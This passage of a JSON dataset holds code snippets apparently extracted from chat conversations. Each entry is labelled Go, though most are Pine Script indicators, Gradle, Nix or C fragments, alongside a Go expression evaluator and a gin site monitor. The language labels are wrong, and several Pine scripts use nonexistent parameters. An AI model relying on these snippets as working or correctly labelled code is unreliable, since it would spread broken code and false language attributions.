    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"math\"\n\t\"strconv\"\n\t\"strings\"\n\t\"unicode\"\n)\n\n// Define all token types\ntype TokenType int\n\nconst (\n\tEOF TokenType = iota\n\tNumber\n\tPlus\n\tMinus\n\tMultiply\n\tDivide\n\tPower\n\tSqrt\n\tRoot\n\tSin\n\tCos\n\tTan\n\tCot\n\tLeftParen\n\tRightParen\n\tVariable\n\tComma\n)\n\n// Token structure\ntype Token struct {\n\tType  TokenType\n\tValue string\n}\n\nfunc isSpace(r rune) bool {\n\treturn unicode.IsSpace(r)\n}\n\nfunc isDigit(r rune) bool {\n\treturn unicode.IsDigit(r)\n}\n\nfunc isOperator(r rune) bool {\n\treturn strings.ContainsRune(\"+-*/^\", r)\n}\n\nfunc isLetter(r rune) bool {\n\treturn unicode.IsLetter(r)\n}\n\nfunc tokenize(expr string) ([]Token, error) {\n\tvar tokens []Token\n\tfor len(expr) > 0 {\n\t\texpr = strings.TrimSpace(expr)\n\t\tif len(expr) == 0 {\n\t\t\tbreak\n\t\t}\n\t\tvar t Token\n\t\tswitch {\n\t\t// ... (skipping unchanged parts) ...\n\t\tcase Root:\n\t\t\trootIndex := i\n\n\t\t\ti++\n\n\t\t\tj := i\n\t\t\topen := 1\n\t\t\tfor ; open != 0 && j < len(tokens); j++ {\n\t\t\t\tif tokens[j].Type == LeftParen {\n\t\t\t\t\topen++\n\t\t\t\t}\n\t\t\t\tif tokens[j].Type == RightParen {\n\t\t\t\t\topen--\n\t\t\t\t}\n\t\t\t\tif open == 1 && tokens[j].Type == Comma {\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t}\n\t\t\tif j == len(tokens) {\n\t\t\t\treturn 0, fmt.Errorf(\"Mismatched parentheses\")\n\t\t\t}\n\n\t\t\tbaseTokens := tokens[rootIndex+1 : j]\n\t\t\tbase, err := eval(baseTokens)\n\t\t\tif err != nil {\n\t\t\t\treturn 0, err\n\t\t\t}\n\n\t\t\tvalueTokens := tokens[j+1:]\n\n\t\t\tk := j + 1\n\t\t\topen = 1\n\t\t\tfor ; open != 0 && k < len(tokens); k++ {\n\t\t\t\tif tokens[k].Type == LeftParen {\n\t\t\t\t\topen++\n\t\t\t\t}\n\t\t\t\tif tokens[k].Type == RightParen {\n\t\t\t\t\topen--\n\t\t\t\t}\n\t\t\t}\n\t\t\tif k == len(tokens) {\n\t\t\t\treturn 0, fmt.Errorf(\"Mismatched parentheses\")\n\t\t\t}\n\n\t\t\tvalueTokens = tokens[j+1 : k-1]\n\t\t\tvalue, err := eval(valueTokens)\n\t\t\tif err != nil {\n\t\t\t\treturn 0, err\n\t\t\t}\n\n\t\t\tresult, err := applyOperation(Token{Root, \"root\"}, base, value)\n\t\t\tif err != nil {\n\t\t\t\treturn 0, err\n\t\t\t}\n\t\t\tnumStack = append(numStack, result)\n\n\t\t\ti = k - 1\n\n\t\tcase Number:\n\t\t// ... (skipping unchanged parts) ...\n\t\t}\n\t}\n}\n\nfunc main() {\n\texpr := \"root(3, 27)\" \n\ttokens, err := tokenize(expr)\n\tif err != nil {\n\t\tfmt.Println(\"Ошибка при токенизации:\", err)\n\t\treturn\n\t}\n\n\tresult, err := eval(tokens)\n\tif err != nil {\n\t\tfmt.Println(\"Ошибка при вычислении:\", err)\n\t\treturn\n\t}\n\tfmt.Printf(\"%s = %v\\n\", expr, result)\n}",
    "filename": "3a769d191e79dee73b16a50d036e20be_0.go"
  },
  {
    "conversation_hash": "3a769d191e79dee73b16a50d036e20be",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n\texpr := \"root(3, 27)\" \n\ttokens, err := tokenize(expr)\n\tif err != nil {\n\t\tfmt.Println(\"Ошибка при токенизации:\", err)\n\t\treturn\n\t}\n\n\tresult, err := eval(tokens)\n\tif err != nil {\n\t\tfmt.Println(\"Ошибка при вычислении:\", err)\n\t\treturn\n\t}\n\tfmt.Printf(\"%s = %v\\n\", expr, result)\n}",
    "filename": "3a769d191e79dee73b16a50d036e20be_4.go"
  },
  {
    "conversation_hash": "8984b2740656b8270c9cb33687a547c1",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstudy(\"EMA Cross SMA with Annotation\", overlay=true)\n\nEMA_Len = input(title=\"EMA Length\", type=input.integer, defval=15)\nSMA_Len = input(title=\"SMA Length\", type=input.integer, defval=30)\n\nEMA = ema(close, EMA_Len)\nSMA = sma(close, SMA_Len)\n\nplot(EMA, color=color.blue, linewidth=2)\nplot(SMA, color=color.red, linewidth=2)\n\nema_cross_sma = crossover(EMA, SMA)\n\nplotshape(ema_cross_sma, style=shape.cross, color=color.green, location=location.belowbar, size=size.small)\n\nvar label bullish = na\nvar label bearish = na\n\nif ema_cross_sma\n    if close > open\n        if not na(bullish) \n            label.delete(bullish)\n        label.new(bar_index, high, \"Bullish Cross\", xloc=xloc.bar_index, color=color.green, textcolor=color.white, style=label.style_label_up)\n        bullish := label.get_id(0)\n    else\n        if not na(bearish) \n            label.delete(bearish)\n        label.new(bar_index, low, \"Bearish Cross\", xloc=xloc.bar_index, color=color.red, textcolor=color.white, style=label.style_label_down)\n        bearish := label.get_id(1)",
    "filename": "8984b2740656b8270c9cb33687a547c1_1.go"
  },
  {
    "conversation_hash": "8984b2740656b8270c9cb33687a547c1",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstudy(\"EMA Cross SMA with Annotation\", overlay=true)\n\nEMA_Len = input(title=\"EMA Length\", type=input.integer, defval=15)\nSMA_Len = input(title=\"SMA Length\", type=input.integer, defval=30)\n\nEMA = ema(close, EMA_Len)\nSMA = sma(close, SMA_Len)\n\nplot(EMA, color=color.blue, linewidth=2)\nplot(SMA, color=color.red, linewidth=2)\n\nema_cross_sma = crossover(EMA, SMA)\n\nplotshape(ema_cross_sma, style=shape.cross, color=color.green, location=location.belowbar, size=size.small)\n\nvar label bullish = na\nvar label bearish = na\n\nif ema_cross_sma\n    if close > open\n        if not na(bullish) \n            label.delete(bullish)\n        label.new(bar_index, high, \"Bullish Cross\", xloc=xloc.bar_index, color=color.green, textcolor=color.white, style=label.style_label_up)\n        bullish := label.get_id(0)\n    else\n        if not na(bearish) \n            label.delete(bearish)\n        label.new(bar_index, low, \"Bearish Cross\", xloc=xloc.bar_index, color=color.red, textcolor=color.white, style=label.style_label_down)\n        bearish := label.get_id(1)",
    "filename": "8984b2740656b8270c9cb33687a547c1_2.go"
  },
  {
    "conversation_hash": "8984b2740656b8270c9cb33687a547c1",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstudy(\"EMA Cross SMA with Annotations\", overlay=true)\n\nEMA_Len = input(title=\"EMA Length\", type=input.integer, defval=15)\nSMA_Len = input(title=\"SMA Length\", type=input.integer, defval=30)\n\nEMA = ema(close, EMA_Len)\nSMA = sma(close, SMA_Len)\n\nplot(EMA, color=color.blue, linewidth=2)\nplot(SMA, color=color.red, linewidth=2)\n\nema_cross_sma = crossover(EMA, SMA)\nsma_cross_ema = crossover(SMA, EMA)\n\nplotshape(ema_cross_sma, style=shape.cross, color=color.green, location=location.belowbar, size=size.small)\nplotshape(sma_cross_ema, style=shape.cross, color=color.red, location=location.abovebar, size=size.small)\n\nvar label bullish_ema_sma = na\nvar label bearish_ema_sma = na\nvar label bullish_sma_ema = na\nvar label bearish_sma_ema = na\n\nif ema_cross_sma\n    if not na(sma_cross_ema)\n        if close > open\n            if not na(bullish_ema_sma)\n                label.delete(bullish_ema_sma)\n            label.new(bar_index, high, \"Bullish EMA/SMA Cross\", xloc=xloc.bar_index, color=color.green, textcolor=color.white, style=label.style_label_up)\n            bullish_ema_sma := label.get_id(0)\n        else\n            if not na(bearish_ema_sma)\n                label.delete(bearish_ema_sma)\n            label.new(bar_index, low, \"Bearish EMA/SMA Cross\", xloc=xloc.bar_index, color=color.red, textcolor=color.white, style=label.style_label_down)\n            bearish_ema_sma := label.get_id(1)\n            \nif sma_cross_ema\n    if not na(ema_cross_sma)\n        if close > open\n            if not na(bullish_sma_ema)\n                label.delete(bullish_sma_ema)\n            label.new(bar_index, high, \"Bullish SMA/EMA Cross\", xloc=xloc.bar_index, color=color.green, textcolor=color.white, style=label.style_label_up)\n            bullish_sma_ema := label.get_id(2)\n        else\n            if not na(bearish_sma_ema)\n                label.delete(bearish_sma_ema)\n            label.new(bar_index, low, \"Bearish SMA/EMA Cross\", xloc=xloc.bar_index, color=color.red, textcolor=color.white, style=label.style_label_down)\n            bearish_sma_ema := label.get_id(3)",
    "filename": "8984b2740656b8270c9cb33687a547c1_3.go"
  },
  {
    "conversation_hash": "6afdb630aa8abb31ce5ecdc69218dc1c",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "plugins {\n   id 'org.openjfx.javafxplugin' version '0.0.8'\n}\n\njavafx {\n   version = \"16\"\n   modules = [ 'javafx.controls', 'javafx.fxml' ]\n}\n\napplication {\n   mainClassName = 'com.example.MyApp'\n}",
    "filename": "6afdb630aa8abb31ce5ecdc69218dc1c_1.go"
  },
  {
    "conversation_hash": "6fd45d2ff11c0f30acdc72f134457866",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "// 考夫曼自适应指数（KAMA）函数\n// Input: in, 数组；len, 数组长度；ER_Length, EMA快线参数；SC_Length, EMA慢线参数；LW_Length, LWMA长周期参数\n// Output: kama, 考夫曼自适应指数的数组\n// 定义函数\nMA_KAMA(in,len,ER_Length,SC_Length,LW_Length) =>\n    // 定义变量\n\tvar kama := 0.0, prevKAMA := 0.0, er := 0.0, fastSC := 0.0, slowSC := 0.0, lwmaSC := 0.0, change := 0.0;\n\t// 计算缩放因子，缩放因子与价格波动幅度相关\n\tvar const1 := 2.0/(ER_Length+1), const2 := 2.0/(SC_Length+1), const3 := 2.0/(LW_Length+1);\n\tvar ocRange := (HHV(in,len)-LLV(in,len))/StdDev(in,len);\n\tvar scaledOCRange := ocRange/(in[len-1]);\n\n\t// 依次计算KAMA的数组，从最新到最旧\n\tfor i := len-1; i >= 0; i-1 do\n\t\tif i == len-1 then\n\t\t\t// 首个kama值等于最后一个收盘价\n\t\t\tkama := in[i];\n\t\telse\n\t\t\t// 计算方向因子\n\t\t\tchange := Abs(in[i+1]-in[i]);\n\t\t\ter := Abs((in[i]-in[i-1])/in[i-1]);\n\t\t\tfastSC := const1*change + (1.0-const1)*fastSC[1];\n\t\t\tslowSC := const2*change + (1.0-const2)*slowSC[1];\n\t\t\tlwmaSC := const3*change*(in[i]/in[len-1]) + (1.0-const3)*lwmaSC[1];\n\t\t\tdirection := Abs(fastSC/scaledOCRange)+Abs(slowSC/scaledOCRange)+Abs(lwmaSC/scaledOCRange);\n\t\t\t// 计算考夫曼自适应指数\n\t\t\tkama := kama[1] + direction*(in[i]-kama[1]);\n\t\tendif;\n\t\t// 检查KAMA的值是否为NULL，如果是，使用前一个值替代\n\t\tif IsNaN(kama) then\n\t\t\tkama := prevKAMA;\n\t\tendif;\n\t\tprevKAMA := kama;\n\t\tResult[i] := kama;\n\tendfor;\n\tResult",
    "filename": "6fd45d2ff11c0f30acdc72f134457866_0.go"
  },
  {
    "conversation_hash": "b327ed861e6869656617a180a3fcf3ea",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"net/http\"\n\t\"time\"\n\t\"errors\"\n\t\"log\"\n\n\t\"github.com/gin-gonic/gin\"\n)\n\ntype Site struct {\n\tUrl         string\n\tAccessTime  time.Duration\n\tLastChecked time.Time\n}\n\nvar siteList = []Site{\n\t{Url: \"http://google.com\"},\n\t{Url: \"http://youtube.com\"},\n\t// ...\n}\n\nfunc checkAccessTime(site *Site) error {\n\tstart := time.Now()\n\tres, err := http.Get(site.Url)\n\tif err != nil {\n\t\treturn err\n\t}\n\tdefer res.Body.Close()\n\tif res.StatusCode != http.StatusOK {\n\t\treturn errors.New(\"site not reachable\")\n\t}\n\tduration := time.Since(start)\n\tsite.AccessTime = duration\n\tsite.LastChecked = start\n\treturn nil\n}\n\nfunc monitorSites(duration time.Duration) {\n\tticker := time.NewTicker(duration)\n\tfor range ticker.C {\n\t\tfor i, site := range siteList {\n\t\t\terr := checkAccessTime(&site)\n\t\t\tif err != nil {\n\t\t\t\tlog.Printf(\"Error checking site %s: %v\\n\", site.Url, err)\n\t\t\t} else {\n\t\t\t\tsiteList[i].AccessTime = site.AccessTime\n\t\t\t\tsiteList[i].LastChecked = site.LastChecked\n\t\t\t}\n\t\t}\n\t}\n}\n\nfunc main() {\n\tgo monitorSites(time.Minute)\n\n\trouter := gin.Default()\n\n\trouter.GET(\"/sites/:site\", func(c *gin.Context) {\n\t\tsiteName := c.Param(\"site\")\n\t\tfor _, site := range siteList {\n\t\t\tif site.Url == siteName {\n\t\t\t\tc.JSON(http.StatusOK, gin.H{\"duration\": site.AccessTime.String()})\n\t\t\t\treturn\n\t\t\t}\n\t\t}\n\t\tc.JSON(http.StatusNotFound, gin.H{\"error\": \"site not found\"})\n\t})\n\n\trouter.GET(\"/sites/min\", func(c *gin.Context) {\n\t\tminSite := siteList[0]\n\t\tfor _, site := range siteList {\n\t\t\tif site.AccessTime < minSite.AccessTime {\n\t\t\t\tminSite = site\n\t\t\t}\n\t\t}\n\t\tc.JSON(http.StatusOK, gin.H{\"url\": minSite.Url, \"duration\": minSite.AccessTime.String()})\n\t})\n\n\trouter.GET(\"/sites/max\", func(c *gin.Context) {\n\t\tmaxSite := siteList[0]\n\t\tfor _, site := range siteList {\n\t\t\tif site.AccessTime > maxSite.AccessTime {\n\t\t\t\tmaxSite = site\n\t\t\t}\n\t\t}\n\t\tc.JSON(http.StatusOK, gin.H{\"url\": maxSite.Url, \"duration\": maxSite.AccessTime.String()})\n\t})\n\n\trouter.Run(\":8080\")\n}",
    "filename": "b327ed861e6869656617a180a3fcf3ea_1.go"
  },
  {
    "conversation_hash": "51caf131e3326eac1a577aa946d5b636",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "#define func(x) (func)(x)\n\nvoid func(int x) {\n    // ...\n}",
    "filename": "51caf131e3326eac1a577aa946d5b636_0.go"
  },
  {
    "conversation_hash": "760f9ed11325bda18293b8dc618f8d5e",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstudy(title=\"Bollinger Bands with Weighted Volatility\", overlay=false)\n\n// Input Variables\nlength = input(title=\"Length\", type=input.integer, defval=20, minval=1)\ndeviations = input(title=\"Deviations\", type=input.float, defval=2.0, minval=0.1, step=0.1)\nvolatility_length = input(title=\"Volatility Length\", type=input.integer, defval=20, minval=1)\n\n// Calculate Bollinger Bands\nbasis = 0.0\ndev = 0.0\nupper = 0.0\nlower = 0.0\n\nsum = 0.0\nfor i = 0 to length - 1\n    sum := sum + close[i]\nbasis := sum / length\n\ndev_sum = 0.0\nfor i = 0 to length - 1\n    dev_sum := dev_sum + pow(close[i] - basis, 2)\ndev := sqrt(dev_sum / length) * deviations\n\nupper := basis + dev\nlower := basis - dev\n\n// Calculate Volatility Weighted by Volume\nvolatility_weighted = 0.0\n\nfor i = 1 to volatility_length\n    change = close[i] - close[i - 1]\n    volatility_weighted := volatility_weighted + pow(change, 2)\n\nvolatility_weighted := sqrt(volatility_weighted / volatility_length) * volume\n\n// Plot Bollinger Bands and Volatility Weighted by Volume\nplot(basis, color=color.blue, title=\"Basis\")\nfill(upper, lower, color=color.blue, title=\"Bollinger Bands\")\n\ncol = close > open ? color.green : color.red // set column color based on price direction\nplot(volatility_weighted, color=col, title=\"Volatility Weighted by Volume\", style=plot.style_columns)\n\n// Set Y-Axis Scale for Volatility Window\nvolatility_scale = 0.0\n\nfor i = 1 to bar_index\n    high_val = high[i]\n    low_val = low[i]\n    if i == 1\n        range := high_val - low_val\n    else\n        range := max(high_val, close[i - 1]) - min(low_val, close[i - 1])\n    volatility_scale := max(volatility_scale, range)\n\nvolatility_scale := volatility_scale * 2\n\n// Plot Volatility Window\nplot(volatility_weighted, color=col, title=\"Volatility Weighted by Volume\", style=plot.style_columns, secondary=true, scale=scale.inherit, min=0, max=volatility_scale)",
    "filename": "760f9ed11325bda18293b8dc618f8d5e_0.go"
  },
  {
    "conversation_hash": "760f9ed11325bda18293b8dc618f8d5e",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstudy(title=\"Bollinger Bands with Weighted Volatility\", overlay=false)\n\n// Input Variables\nlength = input(title=\"Length\", type=input.integer, defval=20, minval=1)\ndeviations = input(title=\"Deviations\", type=input.float, defval=2.0, minval=0.1, step=0.1)\nvolatility_length = input(title=\"Volatility Length\", type=input.integer, defval=20, minval=1)\n\n// Calculate Bollinger Bands\nbasis = 0.0\ndev = 0.0\nupper = 0.0\nlower = 0.0\n\nsum = 0.0\nfor i = 0 to length - 1\n    sum := sum + close[i]\nbasis := sum / length\n\ndev_sum = 0.0\nfor i = 0 to length - 1\n    dev_sum := dev_sum + pow(close[i] - basis, 2)\ndev := sqrt(dev_sum / length) * deviations\n\nupper := basis + dev\nlower := basis - dev\n\n// Calculate Volatility Weighted by Volume\nvolatility_weighted = 0.0\n\nfor i = 1 to volatility_length\n    change = close[i] - close[i - 1]\n    volatility_weighted := volatility_weighted + pow(change, 2)\n\nvolatility_weighted := sqrt(volatility_weighted / volatility_length) * volume\n\n// Plot Bollinger Bands and Volatility Weighted by Volume\nplot(basis, color=color.blue, title=\"Basis\")\nfill(upper, lower, color=color.blue, title=\"Bollinger Bands\")\n\ncol = close > open ? color.green : color.red // set column color based on price direction\nplot(volatility_weighted, color=col, title=\"Volatility Weighted by Volume\", style=plot.style_columns)\n\n// Set Y-Axis Scale for Volatility Window\nvolatility_scale = 0.0\n\nfor i = 1 to bar_index\n    high_val = high[i]\n    low_val = low[i]\n    if i == 1\n        range := high_val - low_val\n    else\n        range := max(high_val, close[i - 1]) - min(low_val, close[i - 1])\n    volatility_scale := max(volatility_scale, range)\n\nvolatility_scale := volatility_scale * 2\n\n// Plot Volatility Window\nplot(volatility_weighted, color=col, title=\"Volatility Weighted by Volume\", style=plot.style_columns, secondary=true, scale=scale.inherit, min=0, max=volatility_scale)",
    "filename": "760f9ed11325bda18293b8dc618f8d5e_1.go"
  },
  {
    "conversation_hash": "760f9ed11325bda18293b8dc618f8d5e",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstudy(title=\"Bollinger Bands with Weighted Volatility\", overlay=false)\n\n// Input Variables\nlength = input(title=\"Length\", type=input.integer, defval=20, minval=1)\ndeviations = input(title=\"Deviations\", type=input.float, defval=2.0, minval=0.1, step=0.1)\nvolatility_length = input(title=\"Volatility Length\", type=input.integer, defval=20, minval=1)\n\n// Calculate Bollinger Bands\nvar basis = 0.0\nvar dev = 0.0\nvar upper = 0.0\nvar lower = 0.0\n\nvar sum = 0.0\nfor i = 0 to length - 1\n    sum := sum + close[i]\nbasis := sum / length\n\nvar dev_sum = 0.0\nfor i = 0 to length - 1\n    dev_sum := dev_sum + pow(close[i] - basis, 2)\ndev := sqrt(dev_sum / length) * deviations\n\nupper := basis + dev\nlower := basis - dev\n\n// Calculate Volatility Weighted by Volume\nvar volatility_weighted = 0.0\n\nfor i = 1 to volatility_length\n    var change = close[i] - close[i - 1]\n    volatility_weighted := volatility_weighted + pow(change, 2)\n\nvolatility_weighted := sqrt(volatility_weighted / volatility_length) * volume\n\n// Plot Bollinger Bands and Volatility Weighted by Volume\nplot(basis, color=color.blue, title=\"Basis\")\nfill(upper, lower, color=color.blue, title=\"Bollinger Bands\")\n\nvar col = close > open ? color.green : color.red // set column color based on price direction\nplot(volatility_weighted, color=col, title=\"Volatility Weighted by Volume\", style=plot.style_columns)\n\n// Set Y-Axis Scale for Volatility Window\nvar volatility_scale = 0.0\n\nfor i = 1 to bar_index\n    var high_val = high[i]\n    var low_val = low[i]\n    var range = 0.0\n    if i == 1\n        range := high_val - low_val\n    else\n        range := max(high_val, close[i - 1]) - min(low_val, close[i - 1])\n    volatility_scale := max(volatility_scale, range)\n\nvolatility_scale := volatility_scale * 2\n\n// Plot Volatility Window\nplot(volatility_weighted, color=col, title=\"Volatility Weighted by Volume\", style=plot.style_columns, secondary=true, scale=scale.inherit, min=0, max=volatility_scale)",
    "filename": "760f9ed11325bda18293b8dc618f8d5e_2.go"
  },
  {
    "conversation_hash": "e68ce403003651932c55640af2c50ebb",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "android {\n    compileSdkVersion 30\n    defaultConfig {\n        applicationId \"com.test.photoeditor\"\n        minSdkVersion 21\n        targetSdkVersion 30\n        ...\n    }\n    ...\n}",
    "filename": "e68ce403003651932c55640af2c50ebb_1.go"
  },
  {
    "conversation_hash": "8fea753a17b8602417ecc06df85f2702",
    "code_index": 2,
    "language": "Go",
    "libraries": [
      "."
    ],
    "code": "{\n  # ... Outras configurações ...\n\n  boot.kernelPackages = import ./path/to/linux-tkg.nix;\n}",
    "filename": "8fea753a17b8602417ecc06df85f2702_2.go"
  },
  {
    "conversation_hash": "81a03447fa95af31a6794f695b161476",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstudy(\"Bollinger Bands with Weighted Volatility\", overlay=false)\n\n// Input Variables\nlength = input(title=\"Length\", type=input.integer, defval=20, minval=1)\ndeviations = input(title=\"Deviations\", type=input.float, defval=2.0, minval=0.1, step=0.1)\nvolatility_length = input(title=\"Volatility Length\", type=input.integer, defval=20, minval=1)\n\n// Define Variables\nvar source = 0.0\nvar basis = 0.0\nvar dev = 0.0\nvar upper = 0.0\nvar lower = 0.0\nvar volatility = 0.0\nvar volatility_weighted = 0.0\nvar volatility_scale = 0.0\n\n// Calculate Bollinger Bands\nsource := close\nbasis := sum(source, length) / length\ndev := deviations * sqrt(sum(pow(source - basis, 2), length) / length)\nupper := basis + dev\nlower := basis - dev\n\n// Calculate Volatility Weighted by Volume\nchange_source = abs(source - source[1])\nvolatility := sqrt(sum(pow(change_source, 2),volatility_length) / volatility_length)\nvolatility_weighted := volatility * volume\n\n// Plot Bollinger Bands and Volatility Weighted by Volume\nplot(basis, color=color.blue, title=\"Basis\")\nfill(upper, lower, color=color.blue, title=\"Bollinger Bands\")\nplot(volatility_weighted, color=color.yellow, title=\"Volatility Weighted by Volume\", style=plot.style_columns)\n\n// Set Y-Axis Scale for Volatility Window\nvolatility_scale := 2 * (highest(high, length) - lowest(low, length))\nvolatility_scale := volatility_scale == 0 ? 1 : volatility_scale\n\n// Plot Volatility Window\nplot(volatility_weighted, color=color.yellow, title=\"Volatility Weighted by Volume\", style=plot.style_columns, secondaryAxis=true, scale=scale.manual(min=0, max=volatility_scale))",
    "filename": "81a03447fa95af31a6794f695b161476_0.go"
  },
  {
    "conversation_hash": "81a03447fa95af31a6794f695b161476",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstudy(\"Bollinger Bands with Weighted Volatility\", overlay=false)\n\n// Input Variables\nlength = input(title=\"Length\", type=input.integer, defval=20, minval=1)\ndeviations = input(title=\"Deviations\", type=input.float, defval=2.0, minval=0.1, step=0.1)\nvolatility_length = input(title=\"Volatility Length\", type=input.integer, defval=20, minval=1)\n\n// Define Variables\nvar source = 0.0\nvar basis = 0.0\nvar dev = 0.0\nvar upper = 0.0\nvar lower = 0.0\nvar volatility = 0.0\nvar volatility_weighted = 0.0\nvar volatility_scale = 0.0\n\n// Calculate Bollinger Bands\nsource := close\nbasis := sum(source, length) / length\ndev := deviations * sqrt(sum(pow(source - basis, 2), length) / length)\nupper := basis + dev\nlower := basis - dev\n\n// Calculate Volatility Weighted by Volume\nchange_source = abs(source - source[1])\nvolatility := sqrt(sum(pow(change_source, 2),volatility_length) / volatility_length)\nvolatility_weighted := volatility * volume\n\n// Plot Bollinger Bands and Volatility Weighted by Volume\nplot(basis, color=color.blue, title=\"Basis\")\nfill(upper, lower, color=color.blue, title=\"Bollinger Bands\")\nplot(volatility_weighted, color=color.yellow, title=\"Volatility Weighted by Volume\", style=plot.style_columns)\n\n// Set Y-Axis Scale for Volatility Window\nvolatility_scale := 2 * (highest(high, length) - lowest(low, length))\nvolatility_scale := volatility_scale == 0 ? 1 : volatility_scale\n\n// Plot Volatility Window\nplot(volatility_weighted, color=color.yellow, title=\"Volatility Weighted by Volume\", style=plot.style_columns, secondaryAxis=true, scale=scale(min=0, max=volatility_scale))",
    "filename": "81a03447fa95af31a6794f695b161476_1.go"
  },
  {
    "conversation_hash": "81a03447fa95af31a6794f695b161476",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstudy(title=\"Bollinger Bands with Weighted Volatility\", overlay=false)\n\n// Input Variables\nlength = input(title=\"Length\", type=input.integer, defval=20, minval=1)\ndeviations = input(title=\"Deviations\", type=input.float, defval=2.0, minval=0.1, step=0.1)\nvolatility_length = input(title=\"Volatility Length\", type=input.integer, defval=20, minval=1)\n\n// Define Variables\nsource = 0.0\nbasis = 0.0\ndev = 0.0\nupper = 0.0\nlower = 0.0\nvolatility = 0.0\nvolatility_weighted = 0.0\nvolatility_scale = 0.0\n\n// Calculate Bollinger Bands\nsource := close\nfor i = length to 1 by -1\n    basis := basis + source[i]\nbasis := basis / length\nfor i = length to 1 by -1\n    dev := dev + pow(source[i] - basis, 2)\n    if i == 1\n        dev := sqrt(dev / length) * deviations\nupper := basis + dev\nlower := basis - dev\n\n// Calculate Volatility Weighted by Volume\nchange_source = 0.0\nfor i = 1 to length\n    change_source := change_source + abs(source[i] - source[i-1])\nvolatility := 0.0\nfor i = volatility_length to 1 by -1\n    volatility := volatility + pow(change_source[i], 2)\nvolatility := sqrt(volatility / volatility_length)\nvolatility_weighted := volatility * volume\n\n// Plot Bollinger Bands and Volatility Weighted by Volume\nplot(basis, color=color.blue, title=\"Basis\")\nplot(upper, color=color.blue, title=\"Upper\", style=plot.style_line)\nplot(lower, color=color.blue, title=\"Lower\", style=plot.style_line)\nplot(volatility_weighted, color=color.yellow, title=\"Volatility Weighted by Volume\", style=plot.style_columns)\n\n// Set Y-Axis Scale for Volatility Window\nvolatility_scale := 2 * (highest(high, length) - lowest(low, length))\nvolatility_scale := volatility_scale == 0 ? 1 : volatility_scale\n\n// Plot Volatility Window\nplot(volatility_weighted, color=color.yellow, title=\"Volatility Weighted by Volume\", style=plot.style_histogram, secondaryAxis=true, minval=0, maxval=volatility_scale)",
    "filename": "81a03447fa95af31a6794f695b161476_2.go"
  },
  {
    "conversation_hash": "81a03447fa95af31a6794f695b161476",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstudy(title=\"Bollinger Bands with Weighted Volatility\", overlay=false)\n\n// Input Variables\nlength = input(title=\"Length\", type=input.integer, defval=20, minval=1)\ndeviations = input(title=\"Deviations\", type=input.float, defval=2.0, minval=0.1, step=0.1)\nvolatility_length = input(title=\"Volatility Length\", type=input.integer, defval=20, minval=1)\n\n// Define Variables\nsource = 0.0\nbasis = 0.0\ndev = 0.0\nupper = 0.0\nlower = 0.0\nvolatility = 0.0\nvolatility_weighted = 0.0\nvolatility_scale = 0.0\n\n// Calculate Bollinger Bands\nsource := close\nfor i = length to 1 by -1\n    basis := basis + source[i]\nbasis := basis / length\nfor i = length to 1 by -1\n    dev := dev + pow(source[i] - basis, 2)\n    if i == 1\n        dev := sqrt(dev / length) * deviations\nupper := basis + dev\nlower := basis - dev\n\n// Calculate Volatility Weighted by Volume\nchange_source = 0.0\nfor i = 1 to length\n    change_source := change_source + abs(source[i] - source[i-1])\nvolatility := 0.0\nfor i = volatility_length to 1 by -1\n    volatility := volatility + pow(change_source[i], 2)\nvolatility := sqrt(volatility / volatility_length)\nvolatility_weighted := volatility * volume\n\n// Define Bollinger Band colors\nband_color = basis > basis[1] ? color.green : color.red\n\n// Plot Bollinger Bands and Volatility Weighted by Volume\nplot(basis, color=color.blue, title=\"Basis\")\np1 = plot(upper, color=band_color, title=\"Upper\", style=plot.style_line)\np2 = plot(lower, color=band_color, title=\"Lower\", style=plot.style_line)\nfill(p1, p2, color=band_color, transp=70, title=\"Bollinger Bands\")\nplot(volatility_weighted, color=color.yellow, title=\"Volatility Weighted by Volume\", style=plot.style_histogram)\n\n// Set Y-Axis Scale for Volatility Window\nvolatility_scale := 2 * (highest(high, length) - lowest(low, length))\nvolatility_scale := volatility_scale == 0 ? 1 : volatility_scale\n\n// Plot Volatility Window\nvol_hist = plot(volatility_weighted, color=color.yellow, title=\"Volatility Weighted by Volume\", style=plot.style_histogram, secondaryAxis=true)\nplot(volatility_scale, color=color.white, title=\"Volatility Scale\", style=plot.style_line, linewidth=2, opacity=70, secondaryAxis=true)",
    "filename": "81a03447fa95af31a6794f695b161476_3.go"
  },
  {
    "conversation_hash": "dd1086dde896c7181b3a6a0ffe45db49",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
